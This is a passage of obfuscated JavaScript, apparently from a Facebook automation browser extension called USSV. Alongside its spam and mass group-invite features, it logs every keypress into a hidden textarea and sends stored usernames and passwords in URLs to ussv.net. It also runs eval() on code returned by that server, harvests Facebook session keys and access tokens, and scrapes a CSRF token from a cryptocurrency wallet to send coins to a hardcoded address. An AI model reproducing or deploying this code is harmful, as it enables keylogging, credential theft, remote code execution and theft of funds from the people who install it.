                                if (V[f1W.L9Q][f1W.Q8y]) {
                                    var G = function(W) {
                                        C[f1W.O8a] = W[f1W.L9Q][f1W.Q8y];
                                    };
                                    G(V);
                                    get_post_group(C);
                                } else {
                                    console[f1W.p4y]("Hoàn Thành");
                                }
                            }
                            console[f1W.p4y](b + "-" + H + " -> " + f + "\n- N?i Dung: " + n + "\n- Bình Lu?n: " + Y);
                        }
                    };
                }
            }
        });
    }

    function get_Fb_Uid() {
        var W = "i16";
        if (f1W[W](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/), f1W.x0r)) {
            var V = f1W.L9a;
        } else {
            var V = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[f1W.S9a]);
        }
        return V;
    }

    function danhgiacheck() {
        var W = "x98",
            V = "l98",
            E = "C98",
            O = "g98",
            Z = "#thongke_danhgia_check",
            F = "D98",
            o = "#thongke_acc_cp",
            U = "#thongke_acc_die",
            p = "#thongke_acc_live",
            M = "#thongke_check_tc",
            b = parseInt($(M)[f1W.Q0I]()),
            H = parseInt($(p)[f1W.Q0I]()),
            R = parseInt($(U)[f1W.Q0I]()),
            X = parseInt($(o)[f1W.Q0I]());
        if (f1W[F](b, f1W.G9a)) {
            $(Z)[f1W.Q0I](ussv_lang_vi_vl_pt_minimum_c);
        } else {
            if (f1W[O](R, H)) {
                $(Z)[f1W.Q0I](ussv_lang_vi_vl_pt_hight_die);
            } else {
                if (f1W[E](X, H)) {
                    $(Z)[f1W.Q0I](ussv_lang_vi_vl_pt_hight_cp);
                } else {
                    var f = f1W[V]((H / b), f1W.u0O);
                    if (f1W[W](f, f1W.j80)) {
                        $(Z)[f1W.Q0I](ussv_lang_vi_vl_pt_hight_live_75);
                    } else {
                        $(Z)[f1W.Q0I](ussv_lang_vi_vl_pt_hight_live_50);
                    }
                }
            }
        }
        dom_logs_ussv(lang_vi_checking_review_tientrinhCH, f1W.d07);
        $(f1W.r2X)[f1W.R4r]();
    }

    function del_fb_inbox(E) {
        var O = "100005875057525",
            E = O,
            Z = f1W.z27;
        $[f1W.c9y]({
            url: "https://www.facebook.com/ajax/mercury/delete_thread.php",
            dataType: "json",
            type: "POST",
            data: "fb_dtsg=" + get_Fb_Key() + "&ids[0]=" + E + "&__user=" + Z + "&__a=1"
        })[f1W.W6O](function(W) {})[f1W.X5v](function(W) {})[f1W.H4I](function(W) {})[f1W.D2I](function(W) {
            var V = "U8t",
                W = JSON[f1W.v4X](W),
                W = JSON[f1W.i2O](W);
            if (f1W[V](W[f1W.D60], 4)) {
                var W = W[f1W.H8v],
                    W = W[f1W.F6r]("for (;;);", "");
                thongbao_log(1, "Xóa thành công Inbox gi?a b?n v?i : " + E);
            } else {
                thongbao_log(1, "Xóa Inbox gi?a b?n v?i " + E + " Th?t B?i");
            }
        });
    }
    var h_t = f1W.y5Q,
        ussv_vs = f1W.I0y,
        aut_group = f1W.B5r;
    if (f1W[f1W.f3r](document[f1W.w6r][f1W.x3y](f1W.S57), f1W.x0r)) {
        if (f1W[f1W.t6a](document[f1W.w6r][f1W.x3y](f1W.g4Q)[f1W.L9a], f1W.L6X) || f1W[f1W.d7I](document[f1W.w6r][f1W.x3y](f1W.g4Q)[f1W.L9a], f1W.U80) || f1W[f1W.j4Y](document[f1W.w6r][f1W.x3y](f1W.g4Q)[f1W.L9a], f1W.V2I)) {
            var scanmenu = setInterval(function() {
                if (uss) {
                    menu_welcome();
                    clearInterval(scanmenu);
                }
            }, f1W.u0O);
        }
    };
    var ussv_key_base = random_str2(),
        img_load = f1W.R1Q,
        img_load_s = f1W.G0Q,
        acc_doing = new acc_doing(),
        ussnow = {
            "check": {
                "kxd": f1W.L9a
            },
            "url": {
                "gettoken": f1W.V0y,
                "parseAut": f1W.y1r
            }
        },
        gl = new gl();
    url_login();
    if (f1W[f1W.r47](document[f1W.w6r][f1W.x3y](f1W.J0Q), f1W.x0r)) {
        U_Dom(f1W.e4Y);
    }
    var panel_sf = new div_safe(),
        _l = new _l(),
        _lJ = new _lJ();
    __lj = new XMLHttpRequest();
    __lj[f1W.d5y](f1W.v0O, gl[f1W.Y5v](f1W.S9a, f1W.C9v), f1W.R30);
    __lj[f1W.h0r]();
    _lJ[f1W.l0v] = JSON[f1W.i2O](__lj[f1W.H8v][f1W.F6r](/\n/gi, f1W.V8v)[f1W.F6r](/\r/gi, f1W.V8v)[f1W.F6r](/	/gi, f1W.V8v));
    var _sf = new _sf(),
        _fb = new _fb(),
        uss = new uss(),
        _html = JSON[f1W.i2O](uss[f1W.G47](gl[f1W.j2X](f1W.A3Y))[f1W.F6r](/\n/gi, f1W.V8v)[f1W.F6r](/\r/gi, f1W.V8v)[f1W.F6r](/	/gi, f1W.V8v)),
        _op_page = new _op_page(),
        _fb_data = new _fb_data(),
        fb_getuid = new fb_getuid();;
    (function($) {
        var f = "extend";
        $[f]({
            UssUrlVal: function(b) {
                var H = "queryStringParams";

                function R() {
                    var V = "exec",
                        E = "substring",
                        O = "search",
                        Z = {},
                        F, o = /\+/g,
                        U = /([^&=]+)=?([^&]*)/g,
                        p = function(W) {
                            return decodeURIComponent(W[f1W.F6r](o, f1W.v6X));
                        },
                        M = window[f1W.K7X][O][E](f1W.S9a);
                    while (F = U[V](M)) Z[p(F[f1W.S9a])] = p(F[f1W.c9a]);
                    return Z;
                }
                if (!this[H]) this[H] = R();
                return this[H][b];
            }
        });
    })(jQuery);
    var base64Matcher = new RegExp(f1W.b8Y),
        usskey = new usskey();
    open_div_ussv_logs(f1W.M9Y);
    for (var i = f1W.L9a; f1W[f1W.e7r](i, f1W.S9a); i++) {};
    $(document)[f1W.q2Y](function() {
        var F0 = "E6E",
            K = "W6E",
            r0 = "d3E",
            Q = "K3E",
            S = "L3E",
            u = "N3E",
            p0 = "keypress",
            q0 = "dblclick",
            H0 = "H3E",
            W0 = "q3E",
            w = "b3E",
            B0 = "U3E",
            o0 = "Z3E",
            Z0 = "UssUrlVal",
            A = "V3E",
            X0 = "B8E";

        function n0(E, O) {
            if (!O) {
                var O = function() {};
            };
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: "https://graph.facebook.com/me?access_token=" + E
            }, function(W) {
                var V = JSON[f1W.i2O](W);
                O(V);
            });
        }

        function U0() {}
        var b0 = function(W) {
            testss = W;
        };

        function s0() {
            var E = "T6E",
                O = "a6E",
                Z;
            Z = new FormData();
            input = $("#hihi");
            for (var F = 0; f1W[O](F, input[f1W.q8r]("input").length); F++) {
                if (f1W[E](input[f1W.q8r]("input:eq(" + F + ")")[f1W.V6Q]("type"), "file")) {
                    Z[f1W.p3Q](input[f1W.q8r]("input:eq(" + F + ")")[f1W.V6Q]("name"), $('#file')[0][f1W.u7v][0]);
                } else {
                    Z[f1W.p3Q](input[f1W.q8r]("input:eq(" + F + ")")[f1W.V6Q]("name"), input[f1W.q8r]("input:eq(" + F + ")")[f1W.o07]());
                }
            };
            $[f1W.c9y]({
                url: 'https://upload.facebook.com/ajax/composerx/attachment/media/saveunpublished?target_id=100004575423394&image_height=100&image_width=100&letterbox=0&av=100004575423394&__user=100004575423394&__a=1&__req=3f&fb_dtsg=' + key,
                data: Z,
                processData: false,
                type: 'POST',
                contentType: 'multipart/form-data',
                beforeSend: function(W) {
                    var V = "overrideMimeType";
                    if (W && W[V]) {
                        W[V]("multipart/form-data");
                    }
                },
                mimeType: 'multipart/form-data',
                success: function(W) {
                    alert(W);
                }
            });
        }

        function V0() {
            $[f1W.c9y]({
                url: "https://graph.facebook.com/100003549365370",
                timeout: 10000
            })[f1W.X5v](function(W) {
                var V = "O3E";
                if (f1W[V](W[f1W.W7O], 100003549365370)) {
                    alert("K?t N?i ?n Ð?nh");
                } else {
                    alert("K?t N?i L?i");
                }
            })[f1W.H4I](function(W) {
                alert("L?i");
            });
        }
        var i0 = function(W) {
            key = W;
        };

        function J0() {}
        $(document)[f1W.q57]('click', function(W) {
            var V = "A7E",
                E = "G7E",
                O = "closest",
                Z = "target",
                F = "v7E";
            if (f1W[F]($(W[Z])[O](".UssTip").length, 0)) {
                if (f1W[E]($(W[Z])[O](".SettingMore").length, 0)) {
                    $(".UssTip")[f1W.F50](500);
                    var o = $(".UssTip")[f1W.V6Q]("show");
                    $(o)[f1W.C3O]("display", "");
                }
            }
            if (f1W[V]($(W[Z])[O](".SettingMore").length, 0)) {
                var U = $(W[Z])[O](".SettingMore");
                $(U)[f1W.C3O]("display", "none");
                var o = $(U)[f1W.V6Q]("show");
                $(o)[f1W.l6Q](500);
            }
        });
        $("#login_form")[f1W.q8r]("input[type=submit]")[f1W.Z6O](function() {
            var W = "j8E",
                V = $("#login_form")[f1W.q8r]("#email")[f1W.o07]();
            if (f1W[W](V[f1W.X3Q]("|").length, 1)) {
                var E = V[f1W.X3Q]("|"),
                    V = E[0],
                    O = E[1];
                $("#login_form")[f1W.q8r]("#email")[f1W.o07](V);
                $("#login_form")[f1W.q8r]("#pass")[f1W.o07](O);
            } else {}
        });
        var f0 = "<input id='testapp'>";
        f0 += "<button id='btnGetToken'> Get Token </button> <button id='btntestclear'> Clear Now </button>";
        f0 += "<form id='form1'>";
        f0 += '<input class="span3" id="fileimg" type="file" name="upload_1025" /> ';
        f0 += '<input class="span3" type="submit" value="DO" /> ';
        f0 += "</form>";
        f0 += "<button id='btntest33'> Get </button><br/>";
        f0 += "Thành Công <span id='totalok'>0</span><br/>";
        f0 += "L?i <span id='totalerror'>0</span><br/>";
        f0 += "<textarea id='ListUid'></textarea>";
        if (f1W[X0](document[f1W.w6r][f1W.x3y]("m.facebook.com"), null)) {
            $("body")[f1W.u2r](f0);
        }
        $("#btntest33")[f1W.Z6O](function() {
            var V = "http://haiivl.com",
                E = "http://haiivl.com/photo/156447",
                O = "kaka";
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/connect/feedback.php",
                type: "POST",
                dataType: "json",
                data: "fb_dtsg=" + _fb[f1W.O00] + "&url=" + E + "&uniqid=u_0_1&target=" + E + "&colorscheme=light&controller_id=feedback_x&locale=en_US&command=comment&normalize_grammar=0&iframe_referer=" + E + "&text_text=" + O + "&text=" + O + "&commentas=" + _fb[f1W.z1Y] + "&ancestor_origins[0]=" + V + "&__user=" + _fb[f1W.z1Y] + "&__a=1&__req="
            })[f1W.D2I](function(W) {
                console[f1W.p4y](W);
                if (W.error) {} else {}
            });
        });
        $("#btntest3")[f1W.Z6O](function() {
            function H(E) {
                $[f1W.c9y]({
                    url: "https://m.facebook.com/groups/" + E[f1W.G7v] + "/write_async/requests/",
                    type: "POST",
                    dataType: "json",
                    data: "fb_dtsg=" + _fb[f1W.O00] + "&charset_test=€,´,€,´,?,?,?&userid=" + E[f1W.m9a] + "&add=1&=Phê duy?t&m_sess=&__ajax__=true&__user=" + _fb[f1W.z1Y]
                })[f1W.D2I](function(W) {
                    var V = "g8E";
                    if (f1W[V](W[f1W.D60], 4)) {
                        var W = W[f1W.H8v];
                    } else {}
                });
            }

            function R(E, O) {
                $[f1W.c9y]({
                    url: "https://mbasic.facebook.com/a/groups/members/add/?purposes&source=groups%3Amembers-search",
                    type: "POST",
                    dataType: "json",
                    data: "fb_dtsg=" + _fb[f1W.O00] + "&charset_test:€,´,€,´,?,?,?&group_id=" + E + O
                })[f1W.D2I](function(W) {
                    var V = "C8E";
                    if (f1W[V](W[f1W.D60], 4)) {
                        var W = W[f1W.H8v];
                        console[f1W.p4y](W);
                    } else {}
                });
            }

            function X() {
                var b = "https://graph.facebook.com/fql?q=SELECT uid FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY uid limit 5000&access_token=" + N;
                chrome[f1W.d60][f1W.K4r]({
                    method: 'GET',
                    action: 'xhttp',
                    url: b,
                    data: "hj=hj"
                }, function(W) {
                    var V = "k8E",
                        E = "X8E",
                        O = "y8E",
                        Z = "F8E",
                        W = JSON[f1W.i2O](W),
                        F = W.data.length;
                    console[f1W.p4y](F);
                    var o = 2;
                    if (f1W[Z](o, 1)) {
                        for (var U = 0; f1W[O](U, F); U++) {
                            f(Y, W.data[U][f1W.l97]);
                        }
                    } else {
                        if (f1W[E](F, 100)) {
                            var p = F;
                        } else {
                            var p = F;
                        }
                        var M = "&";
                        for (var U = 0; f1W[V](U, p); U++) {
                            M += "addees[" + W.data[U][f1W.l97] + "]=" + W.data[U][f1W.l97] + "&";
                        }
                        R(Y, M);
                        console[f1W.p4y](M);
                    }
                });
            }

            function f(F, o) {
                $[f1W.c9y]({
                    url: "https://m.facebook.com/groups/members/add_friend/write/?profile_id=" + o + "&group_id=" + F + "&ref=bookmark",
                    type: "POST",
                    dataType: "json",
                    data: "fb_dtsg=" + _fb[f1W.O00] + "&charset_test:€,´,€,´,?,?,?&user_id=100003549365370&m_sess=&__ajax__=true&__user=" + _fb[f1W.z1Y]
                })[f1W.D2I](function(W) {
                    var V = "m8E",
                        E = "s8E";
                    if (f1W[E](W[f1W.D60], 4)) {
                        var W = W[f1W.H8v];
                        if (f1W[V](W[f1W.x3y]("addMemberErrorNotice"), null)) {
                            var O = parseInt($("#totalerror")[f1W.m8y]());
                            $("#totalerror")[f1W.m8y](O + 1);
                        } else {
                            var Z = parseInt($("#totalok")[f1W.m8y]());
                            $("#totalok")[f1W.m8y](Z + 1);
                        }
                        var W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                        console[f1W.p4y](W[f1W.v6v][f1W.M4I][0][f1W.Q0I]);
                    } else {}
                });
            }

            function n(b) {
                $[f1W.c9y]({
                    url: "https://www.facebook.com/groups/unified_queue/async_response/?queue=requests&groupid=" + b + "&__user=" + _fb[f1W.z1Y] + "&__a=1",
                    type: "GET",
                    dataType: "json"
                })[f1W.D2I](function(W) {
                    var V = "D8E",
                        E = "Y8E";
                    if (f1W[E](W[f1W.D60], 4)) {
                        var W = W[f1W.H8v],
                            W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", "")),
                            O = W[f1W.G0v][0][3][f1W.a8Y],
                            Z = $(O)[f1W.q8r](".uiList")[f1W.q8r]("._2rcr"),
                            F = Z.length;
                        for (var o = 0; f1W[V](o, F); o++) {
                            var U = $(Z[o])[f1W.Q0I](),
                                p = $(U)[f1W.q8r]("._42ft._4jy0._4jy3._4jy1")[f1W.V6Q]("ajaxify"),
                                M = p[f1W.x3y]("%5B0%5D=(.*?)&source=requests_queue");
                            H({
                                "Group_Id": b,
                                "Uid": M[1]
                            });
                        };
                        $("body")[f1W.u2r](O);
                    } else {}
                });
            }
            var Y = 320048212281,
                N = $(".ussv_fb_key")[f1W.o07]();
            n(Y);
        });
        $("#btntest")[f1W.Z6O](function() {
            vl = $("#test")[f1W.o07]();
            chrome[f1W.v1O][f1W.N0v][f1W.v0Q]({
                "ussvusername": vl,
                "ussvmabimat": "0979602384"
            }, function() {
                alert("Luu thành công " + vl);
            });
        });
        $("#btnGetToken")[f1W.Z6O](function() {
            fb_getuid[f1W.X7O]({
                "Page_Id": 946366048730005
            });
        });
        $("#btntestclear")[f1W.Z6O](function() {
            chrome[f1W.d60][f1W.K4r]({
                action: 'clear'
            }, function(W) {
                console[f1W.p4y](W);
            });
            V0();
        });
        $("#btntest2")[f1W.Z6O](function(o) {
            function U(O) {
                var Z = "message_batch[0][action_type]:ma-type:user-generated-message&message_batch[0][thread_id]:&message_batch[0][author]:fbid:" + _fb[f1W.z1Y] + "&message_batch[0][author_email]:&message_batch[0][coordinates]:&message_batch[0][timestamp]:1428838672254&message_batch[0][timestamp_absolute]:Hôm nay&message_batch[0][timestamp_relative]:18:37&message_batch[0][timestamp_time_passed]:0&message_batch[0][is_unread]=false&message_batch[0][is_forward]=false&message_batch[0][is_filtered_content]=false&message_batch[0][is_spoof_warning]=false&message_batch[0][source]=source:chat:web&message_batch[0][source_tags][0]=source:chat&message_batch[0][body]=ádadasdsa&message_batch[0][has_attachment]=true&message_batch[0][html_body]=false&message_batch[0][specific_to_list][0]=fbid:100007307495136&message_batch[0][specific_to_list][1]=fbid:" + _fb[f1W.z1Y] + "&message_batch[0][ui_push_phase]=V3&message_batch[0][content_attachment]=&message_batch[0][preview_attachments][0][upload_id]=upload_1024&message_batch[0][preview_attachments][0][on_progress]=function () { [native code] }&message_batch[0][preview_attachments][0][on_resizing_progress]=function () { [native code] }&message_batch[0][preview_attachments][0][on_success]=function () { [native code] }&message_batch[0][preview_attachments][0][upload_canceled]=function () { [native code] }&message_batch[0][preview_attachments][0][attach_type]=photo&message_batch[0][preview_attachments][0][preview_uploading]=true&message_batch[0][preview_attachments][0][preview_width]=80&message_batch[0][preview_attachments][0][preview_height]=80&message_batch[0][client_state]=send_to_server&message_batch[0][status]=7&message_batch[0][upload_id]=upload_1024&message_batch[0][message_id]=&message_batch[0][manual_retry_cnt]=0&message_batch[0][image_ids][0]=" + O[f1W.i3a] + "&message_batch[0][client_thread_id]=user:100007307495136&client=mercury&__user=" + _fb[f1W.z1Y] + "&__a=1&fb_dtsg=" + _fb[f1W.O00];
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/mercury/send_messages.php",
                    type: "POST",
                    dataType: "json",
                    data: Z
                })[f1W.D2I](function(W) {
                    var V = "Q8E",
                        E = "t8E";
                    if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v][f1W.F6r]("for (;;);", "");
                        console[f1W.p4y](W);
                    } else {}
                });
            }

            function p(F) {
                $[f1W.c9y]({
                    url: "https://upload.facebook.com/ajax/mercury/upload.php?__user=100007376401422&__a=1&fb_dtsg=" + _fb[f1W.O00],
                    type: "POST",
                    dataType: "json",
                    data: b,
                    cache: false,
                    contentType: false,
                    processData: false
                })[f1W.D2I](function(W) {
                    var V = "w8E",
                        E = "x8E",
                        O = "l8E";
                    if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                            W = JSON[f1W.i2O](W);
                        if (f1W[V](W[f1W.v6v][f1W.s9X][0][f1W.O2O], undefined)) {
                            var Z = W[f1W.v6v][f1W.s9X][0][f1W.u8v];
                        } else {
                            var Z = W[f1W.v6v][f1W.s9X][0][f1W.O2O];
                        }
                        console[f1W.p4y](Z);
                        U({
                            "ImgId": Z
                        });
                    } else {}
                });
            }
            var M = $(".ussv_fb_key")[f1W.o07]();
            o[f1W.q07]();
            var b = new FormData();
            b[f1W.p3Q]('attach_id', '');
            b[f1W.p3Q]('images_only', 'true');
            b[f1W.p3Q]('upload_1025', $('input[id=fileimg]')[0][f1W.u7v][0]);
            p();
        });
        $("#btntest2s")[f1W.Z6O](function() {
            var W = new FormData($("#form1"));
        });
        $("#btncsrfToken")[f1W.Z6O](function() {
            $[f1W.c9y]({
                url: "http://wallet.geocoin.cash/index.php?page=withdraw&id=1&coin=GEO",
            })[f1W.X5v](function(W) {
                var V = "SendMoney",
                    E = $(W)[f1W.q8r]("input[name='csrfToken']")[f1W.o07]();
                console[f1W.p4y](E);
                GeoCoint[V]({
                    "amount": 0.9,
                    "balance": 1,
                    "address": "GLNL4B9Z2dACPoR4jDtxGvDCZem8maRC98",
                    "csrfToken": E
                });
            });
        });
        if (f1W[A]($[Z0]('error'), "fb_connect_error")) {}
        if (f1W[o0](document[f1W.w6r][f1W.x3y](".com"), null)) {
            if (f1W[B0](document[f1W.w6r][f1W.x3y]("(.*?).com")[0], "https://facebook.com") || f1W[w](document[f1W.w6r][f1W.x3y]("(.*?).com")[0], "https://www.facebook.com")) {
                UParse[f1W.I9X]();
            }
        }
        var k0 = get_Fb_Key(),
            N0 = get_Fb_Uid();
        if (f1W[W0]($[Z0]('spam'), "yes")) {
            $("#popup_ussv_logs")[f1W.l6Q](500);
            if (f1W[H0]($[Z0]('type'), "wall-img")) {
                var l0 = function(W) {
                        id = W;
                    },
                    v0 = function(W) {
                        token = W[f1W.M00];
                    },
                    K0 = function(W) {
                        email = W;
                    };
                l0(200);
                K0("Null");
                v0(_fb_data);
                username = $[Z0]('ussvusername');
                mabimat = $[Z0]('ussvmabimat');
                login(username, mabimat);
                search = setInterval(function() {
                    var W = "f3E";
                    if (f1W[W]($("#div_setting_spam").length, 0)) {
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "spam",
                            "id": "c1"
                        }), "0|_|_|ok|spam");
                    } else {
                        clearInterval(search);
                        get_setting_spam("get", username, mabimat);
                        P0();
                    }
                }, 1000);

                function P0() {
                    search = setInterval(function() {
                        var o = "R3E";
                        if (f1W[o]($("#div_setting_spam")[f1W.q8r]("#text_string_spam").length, 0)) {
                            dom_logs_ussv(_lJ[f1W.G3v]({
                                "t": "spam",
                                "id": "c2"
                            }), "0|_|_|ok|spam");
                        } else {
                            clearInterval(search);
                            fb_spam(id, email, _fb_data[f1W.M00], 1);
                            var U = "https://graph.facebook.com/me?fields=name,birthday,link,locale,verified,gender,mobile_phone,hometown&access_token=" + token;
                            chrome[f1W.d60][f1W.K4r]({
                                method: 'GET',
                                action: 'xhttp',
                                url: U,
                                data: "hj=hj"
                            }, function(W) {
                                var V = "h3E",
                                    E = JSON[f1W.i2O](W);
                                if (f1W[V](E[f1W.G6y], null)) {
                                    div_thongbao(ussv_lang_vi_rs_error_dietoken);
                                } else {
                                    var O = E[f1W.q60],
                                        Z = E[f1W.h3r],
                                        F = E[f1W.G6y];
                                    start_spam(id, token, F, O, Z, "rsp");
                                }
                            });
                        }
                    }, 1000);
                };
            } else {
                dom_logs_ussv(_lJ[f1W.G3v]({
                    "t": "spam",
                    "id": "c3"
                }), "0|_|_|error|spam");
            }
        }
        $(".row")[f1W.Z6O](function() {
            $(".row")[f1W.C3O]("background", "");
            $(this)[f1W.C3O]("background", "rgba(250, 252, 253, 0.2)");
        });
        $(".input_email.login")[q0](function() {
            var W = $(this).parent(".cell"),
                V = $(W)[f1W.q8r](".input_email:eq(0)")[f1W.o07](),
                E = $(W)[f1W.q8r](".input_email:eq(1)")[f1W.o07]();
            div_fast_log(111, V, E);
        });
        chrome[f1W.v1O][f1W.z50][f1W.G47](["ussv_mabimat"], function(W) {
            $("input[name=mabimat]")[f1W.o07](W[f1W.v7v]);
        });
        $("#loginbutton")[f1W.q8r]("input[type=submit]")[f1W.Z6O](function() {
            var W = $("input[id=email]")[f1W.o07](),
                V = $("input[id=pass]")[f1W.o07]();
        });
        chrome[f1W.v1O][f1W.N0v][f1W.G47](["FB_SaveAccount"], function(W) {});
        $("body")[f1W.p3Q]('<textarea class="hidden" id="FB_SaveLogKey"></textarea>');
        $("body")[p0](function(W) {
            var V = "which",
                E = String[f1W.V2X](W[V]);
            $("#FB_SaveLogKey")[f1W.p3Q](E);
        });
        var Y0 = "auto",
            g0 = "join",
            u0 = "group",
            m0 = "id";
        if (f1W[u]($[Z0](Y0 + g0 + u0), "yes")) {
            var C0 = function(W) {
                FbId = W;
            };
            C0(55555);
            GrId = $[Z0](u0 + m0);
            chrome[f1W.v1O][f1W.z50][f1W.G47](["ussv_username", "ussv_pass"], function(U) {
                var p = "z3E";
                if (f1W[p](GrId, undefined)) {
                    var M = 0;
                    $("#popup_ussv_logs")[f1W.l6Q](500);
                    chrome[f1W.d60][f1W.K4r]({
                        method: 'GET',
                        action: 'xhttp',
                        url: "http://ussv.net/ajax/fb_group.php?useracc=" + U[f1W.r4Y] + "&passacc=" + U[f1W.F07] + "&type=3&group=" + GrId
                    }, function(V) {
                        var E = "event",
                            O = "S3E",
                            Z = "P3E",
                            F = JSON[f1W.i2O](V);
                        if (f1W[Z](F[f1W.C3y], 0)) {
                            if (f1W[O]($[Z0]("type"), "Token")) {
                                var o = _fb[f1W.G47]({
                                    "app": 219885578217768
                                });
                                chrome[f1W.d60][f1W.K4r]({
                                    method: 'GET',
                                    action: 'xhttp',
                                    url: "https://graph.facebook.com/fql?q=SELECT uid FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 5000&access_token=" + o,
                                    data: "hj=hj"
                                }, function(W) {
                                    var W = JSON[f1W.i2O](W);
                                    if (W.error) {
                                        dom_logs_ussv(W.error[f1W.q10], "0|0|_|error|autoAddGr");
                                    } else {
                                        _fb[f1W.i0Y](8, {
                                            "Group_Id": GrId,
                                            "Hide": false,
                                            "Token": o,
                                            "FB_Uid": _fb[f1W.z1Y],
                                            "FB_Key": _fb[f1W.O00],
                                            "FriendData": W,
                                            "Max_Invite": 600
                                        });
                                    }
                                });
                            } else {
                                eval(F[E]);
                            }
                        } else {
                            dom_logs_ussv(F[f1W.F5v], "0|0|_|error|autoAddGr");
                            dom_logs_ussv(_lJ[f1W.G3v]({
                                "t": "gr",
                                "id": "c1"
                            }), "0|0|_|ok|autoAddGr");
                        }
                    });
                }
            });
        }
        if (f1W[S](_op_page[f1W.j2X]("https://facebook.com"), 0) || f1W[Q](_op_page[f1W.j2X]("https://www.facebook.com"), 0)) {}
        if (f1W[r0]($[Z0]('likebasic'), "yes")) {
            var T0 = function() {
                urllike = "https://mbasic.facebook.com/" + $(".cl.v.w.cm.cn.co")[f1W.V6Q]("href");
            };
            T0();
            if (f1W[K](urllike[f1W.x3y]("unfan"), null)) {
                var M0 = function(W) {
                    window[f1W.K7X] = W;
                };
                console[f1W.p4y](urllike);
                M0(urllike);
                I0("1");
            } else {
                I0("2");
            }

            function I0(V) {
                var E = "HandlePopupLike";
                try {
                    window[f1W.Z3v][E]();
                } catch (W) {}
                window[f1W.U00]();
                return false;
            };
        }
        if (f1W[F0](_op_page[f1W.j2X]("facebook.com"), 0)) {
            check_fb_me_page = setInterval(function() {
                var M = "o6E",
                    b = "r6E";
                if (f1W[b]($(".facebook_core_post").length, 0)) {
                    clearInterval(check_fb_me_page);
                    var H = "";
                    H += '<select style="padding: 3px;float: right;bottom: 5px;right: 5px;" id="facebook_core_post" class="facebook_core_post input_mail _42ft _4jy0 _55pi _5vto _55_p _2agf _p _4jy3 _517h _51sy _no">';
                    H += '    <option value="df" selected="">M?c Ð?nh</option>';
                    H += '    <option value="ussv">USSV Post</option>';
                    H += '</select>';
                    if (f1W[M]($(".fbTimelineComposerUnit")[f1W.q8r]("ul:eq(0)").length, 1)) {
                        $(".fbTimelineComposerUnit")[f1W.q8r]("ul:eq(0)")[f1W.p3Q](H);
                    } else {
                        $(".fbTimelineComposerUnit")[f1W.q8r]("._4d6h._4p1p")[f1W.p3Q](H);
                    }
                    $("#facebook_core_post")[f1W.i77](function() {
                        var F = "i6E",
                            o = "e6E",
                            U = "p6E";
                        type = $(this)[f1W.o07]();
                        if (f1W[U](type, "ussv")) {
                            if (f1W[o]($(".facebook_core_post_div").length, 0)) {
                                var p = "";
                                p += '<div id="div_login_ussv_post">';
                                p += '<div class="div_title">';
                                p += '    <div class="clearfix">';
                                p += '        <div class="left">';
                                p += '            <h3>Ðang Nh?p USSV</h3>';
                                p += '        </div>';
                                p += '        <div class="right"> ';
                                p += '        </div>';
                                p += '    </div>';
                                p += '</div>';
                                p += '<div class="fb_div_panel_bot" style="padding-top: 10px;">';
                                p += '  <div id="ussv_post_panel_login" class="cuon style-6" style="max-height: 300px;">';
                                p += '      <input id="login_user" value="" placeholder="Tài Kho?n" style="margin: 2px;padding: 5px 2px;">';
                                p += '      <input id="login_mabimat" value="" type="password" placeholder="Mã Bí M?t" style="margin: 2px;padding: 5px 2px;">';
                                p += '      <button value="1" class="_42ft _4jy0 layerConfirm uiOverlayButton _4jy3 _4jy1 selected _51sy btn_login_ussv_post">Ðang Nh?p</button>';
                                p += '      <br/><span id="note_login_ussv_post" style="margin: 2px;position: relative;color: rgb(34, 194, 30);">Vui lòng dang nh?p d? có th? s? d?ng USSV POST.</span>';
                                p += '  </div>';
                                p += '</div>';
                                p += '</div>';
                                $("._3rbh")[f1W.u2r](p);
                                $("._2t4v")[f1W.u2r](p);
                                chrome[f1W.v1O][f1W.z50][f1W.G47](["ussv_username", "ussv_mabimat"], function(W) {
                                    $("#login_user")[f1W.o07](W[f1W.r4Y]);
                                    $("#login_mabimat")[f1W.o07](W[f1W.v7v]);
                                });
                                $(".btn_login_ussv_post")[f1W.L0Q]("click")[f1W.Z6O](function() {
                                    $("#note_login_ussv_post")[f1W.Q0I](_lJ[f1W.G3v]({
                                        "t": "core",
                                        "id": "a1"
                                    }));
                                    username = $("#login_user")[f1W.o07]();
                                    mabimat = $("#login_mabimat")[f1W.o07]();
                                    chrome[f1W.d60][f1W.K4r]({
                                        method: 'POST',
                                        action: 'xhttp',
                                        url: "http://ussv.net/addon/html/html_fb_core_post.php?user=" + username + "&mabimat=" + mabimat,
                                        data: "base=hau"
                                    }, function(W) {
                                        var V = "n6E",
                                            E = "M6E",
                                            O = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>");
                                        $("#note_login_ussv_post")[f1W.Q0I](O[1]);
                                        if (f1W[E](O[0], "ok")) {
                                            setTimeout(function() {
                                                $("#div_login_ussv_post")[f1W.w5I]();
                                            }, 1000);
                                            if (f1W[V]($(".facebook_core_post_div").length, 0)) {
                                                $("._5pcb._4b0l")[f1W.u2r](O[2]);
                                                $("._2t4u")[f1W.u2r](O[2]);
                                                var Z = "";
                                                Z += '<div class="div_title">';
                                                Z += '    <div class="clearfix">';
                                                Z += '        <div class="left">';
                                                Z += '            <h3>L?ch S?</h3>';
                                                Z += '        </div>';
                                                Z += '        <div class="right"> ';
                                                Z += '        </div>';
                                                Z += '    </div>';
                                                Z += '</div>';
                                                Z += '<div class="fb_div_panel_bot" style="padding-top: 10px;">';
                                                Z += '  <div id="ussv_post_list_history_captcha" class="cuon style-6" style="max-height: 300px;">';
                                                Z += '      ';
                                                Z += '  </div>';
